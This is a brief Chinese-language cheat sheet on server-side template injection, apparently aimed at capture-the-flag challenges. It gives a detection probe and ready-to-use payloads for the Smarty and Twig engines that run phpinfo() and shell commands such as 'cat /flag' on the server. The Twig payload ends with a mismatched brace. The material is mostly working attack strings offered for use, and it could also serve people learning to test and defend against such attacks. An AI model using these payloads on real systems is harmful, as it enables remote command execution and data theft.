# SSTI_injection

---

**SSTI模板注入**

```
smarty模板引擎
twig模板引擎
```

**判断注入**

```
参数：user=1                              回显：1
参数：user={{2*2}}                        回显：4
```

**smarty模板引擎**

```
参数：user={if phpinfo()}{/if}            回显：phpinfo页面
参数：user={if system('cat /flag')}{/if}  回显：执行命令cat /flag
```

**twig模板引擎**

```
参数：user={{_self.env.registerUndefined\
FilterCallback("exec")}}{{_self.env.getFi\
lter("cat /flag")}
回显：执行命令cat /flag
```

